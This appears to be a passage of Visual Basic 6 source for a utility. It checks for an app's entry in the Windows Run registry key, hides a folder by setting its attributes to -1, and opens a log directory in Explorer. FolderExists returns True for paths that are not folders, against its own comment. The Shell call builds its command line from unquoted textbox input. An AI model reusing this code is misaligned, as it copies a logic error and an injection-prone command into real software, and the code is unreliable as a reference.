Dim value_type As Long

    ' See if the key exists.
    If RegOpenKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        0, KEY_READ, hKey) = ERROR_SUCCESS _
    Then
        ' Look for the subkey named after the application.
        WillRunAtStartup = _
            (RegQueryValueEx(hKey, app_name, _
                ByVal 0&, value_type, ByVal 0&, ByVal 0&) = _
            ERROR_SUCCESS)

        ' Close the registry key handle.
        RegCloseKey hKey
    Else
        ' Can't find the key.
        WillRunAtStartup = False
    End If
End Function
Function FolderExists(sPath As String) As Boolean
    If Dir$(sPath, 23) <> "" Then
        If (GetAttr(sPath) And vbDirectory) = vbDirectory Then
            FolderExists = True
        Else
            FolderExists = True '-- sPath exists but it is not a folder
        End If
    'Else
        '-- sPath does not exist
    End If
End Function
Private Sub HideThisFolder(ByVal strPath As String, ByVal HideF As Boolean)
    Dim fs As New FileSystemObject
    Dim f
 On Error GoTo err
    Set f = fs.GetFolder(strPath)
If HideF = True Then
    f.Attributes = -1
Else
    f.Attributes = 0
End If

err:

End Sub

Private Sub txtLogDir_DblClick()
If Left(txtLogDir, 2) = "u:" Then txtLogDir = Environ$("USERPROFILE") & Mid(txtLogDir, 3, Len(txtLogDir) - 2)
Shell ("explorer " & txtLogDir.Text), vbNormalFocus
End Sub

